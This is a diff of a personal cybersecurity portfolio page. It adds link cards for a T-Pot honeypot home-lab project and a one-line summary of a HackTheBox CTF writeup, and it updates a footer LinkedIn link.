+<a href="project-tpot.html" style="display:flex;align-items:center;gap:1.25rem;padding:1.25rem 1.5rem;background:var(--surface);border:1px solid var(--border);border-radius:10px;text-decoration:none;transition:background 0.15s,border-color 0.15s;margin-bottom:1rem;" onmouseover="this.style.background='var(--surface2)';this.style.borderColor='var(--border2)'" onmouseout="this.style.background='var(--surface)';this.style.borderColor='var(--border)'">
+<div style="width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent-border);">
+<i class="ti ti-bug"></i>
+</div>
+<div style="flex:1;min-width:0;">
+<div style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:3px;">T-Pot Honeypot &amp; Threat Intelligence Collection</div>
+<div style="font-size:12px;color:var(--text-mid);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">Deployed T-Pot to lure real-world threat actors and collect live attack telemetry, TTPs, and IOCs.</div>
+</div>
+<div style="display:flex;align-items:center;gap:10px;flex-shrink:0;">
+<span style="font-family:var(--mono);font-size:10px;padding:3px 9px;border-radius:4px;color:var(--text-dim);background:var(--surface2);border:1px solid var(--border);">Home Lab</span>
+<span style="font-family:var(--mono);font-size:10px;padding:3px 9px;border-radius:4px;color:var(--accent);background:var(--accent-dim);border:1px solid var(--accent-border);">Completed</span>
+</div>
+<i class="ti ti-arrow-right" style="color:var(--text-dim);font-size:16px;"></i>
+</a>
+
+</section>
+
+<!-- CTF WRITEUPS -->
+<section id="writeups">
+<div class="section-header">
+<span class="section-label">CTF Writeups</span>
+<div class="section-line"></div>
+</div>
+
+<a href="writeup-nexus.html" style="display:flex;align-items:center;gap:1.25rem;padding:1.25rem 1.5rem;background:var(--surface);border:1px solid var(--border);border-radius:10px;text-decoration:none;transition:background 0.15s,border-color 0.15s;margin-bottom:1rem;" onmouseover="this.style.background='var(--surface2)';this.style.borderColor='var(--border2)'" onmouseout="this.style.background='var(--surface)';this.style.borderColor='var(--border)'">
+<div style="width:42px;height:42px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;background:var(--blue-dim);color:var(--blue);border:1px solid var(--blue-border);">
+<i class="ti ti-terminal-2"></i>
+</div>
+<div style="flex:1;min-width:0;">
+<div style="font-size:14px;font-weight:600;color:var(--text);margin-bottom:3px;">Nexus</div>
+<div style="font-size:12px;color:var(--text-mid);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">Leaked Gitea credentials, an authenticated CRM RCE, and a path-traversal bug in a root-run sync script — unauth to root.</div>
+</div>
+<div style="display:flex;align-items:center;gap:10px;flex-shrink:0;">
+<span style="font-family:var(--mono);font-size:10px;padding:3px 9px;border-radius:4px;color:var(--text-dim);background:var(--surface2);border:1px solid var(--border);">HackTheBox</span>
+<span style="font-family:var(--mono);font-size:10px;padding:3px 9px;border-radius:4px;color:var(--accent);background:var(--accent-dim);border:1px solid var(--accent-border);">Rooted</span>
+</div>
+<i class="ti ti-arrow-right" style="color:var(--text-dim);font-size:16px;"></i>
+</a>
+
+</section>
+
 </div>
 
 <footer>
 <div class="container">
 <div class="footer-left">© 2026 Joseph Quintana</div>
 <div class="footer-links">
-<a href="https://linkedin.com/in/joseph-q-630610245" class="btn btn-primary" target="_blank"><i class="ti ti-brand-linkedin"></i>LinkedIn</a>
+<a href="https://www.linkedin.com/in/joseph-q-630610245" class="btn btn-primary" target="_blank"><i class="ti ti-brand-linkedin"></i>LinkedIn</a>
 <a href="mailto:jqui247@wgu.edu" class="btn btn-secondary"><i class="ti ti-mail"></i>Email</a>
 </div>
 </div>
